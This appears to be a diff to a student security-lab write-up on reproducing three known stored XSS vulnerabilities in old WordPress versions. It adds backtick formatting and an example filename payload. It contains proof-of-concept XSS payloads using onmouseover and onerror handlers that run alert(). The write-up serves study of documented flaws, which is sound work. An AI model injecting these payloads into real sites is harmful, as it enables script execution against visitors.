@@ -16,7 +16,7 @@ Time spent: **2** hours spent in total
   - [ ] Steps to recreate: 
     - Make a comment on a page that has at least 64KB of content, for example: 
     
-    <a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>
+    `<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>`
     
   - [ ] Affected source code:
     - [Not the actual source code, but describes the vulnerability](https://klikki.fi/adv/wordpress2.html) 
@@ -28,7 +28,7 @@ Time spent: **2** hours spent in total
   - [ ] GIF Walkthrough: 
     - <img src="LargeFileXSS.gif" width="800">
   - [ ] Steps to recreate: 
-    - Upload a large file, atleast 100MB in size that has the desired payload as the file name.
+    - Upload a large file, atleast 100MB in size that has the desired payload as the file name, such as `Somefile<img src=x onerror=alert(“Vulnerability!”)>.png`.
   - [ ] Affected source code:
     - [Github Link](https://github.com/WordPress/WordPress/commit/8c7ea71edbbffca5d9766b7bea7c7f3722ffafa6)
 3. WordPress < 4.2.3 Stored XSS
@@ -39,7 +39,7 @@ Time spent: **2** hours spent in total
   - [ ] GIF Walkthrough: 
     - <img src="PageXSS.gif" width="800">
   - [ ] Steps to recreate: 
-    - Requires you to be able to create pages, create a link like <a href=“[caption code=“>]</a><a title=“ onmouseover=alert(‘test’) “>link</a>. Wordpress shortcode processing will turn this into <a href="</a><a title=" onmouseover=alert('test')  ">link</a>.
+    - Requires you to be able to create pages, create a link like `<a href=“[caption code=“>]</a><a title=“ onmouseover=alert(‘test’) “>link</a>`.Wordpress shortcode processing will turn this into `<a href="</a><a title=" onmouseover=alert('test')  ">link</a>`.
   - [ ] Affected source code:
     - [Not the actual source code, but describes the vulnerability](https://klikki.fi/adv/wordpress3.html)
 
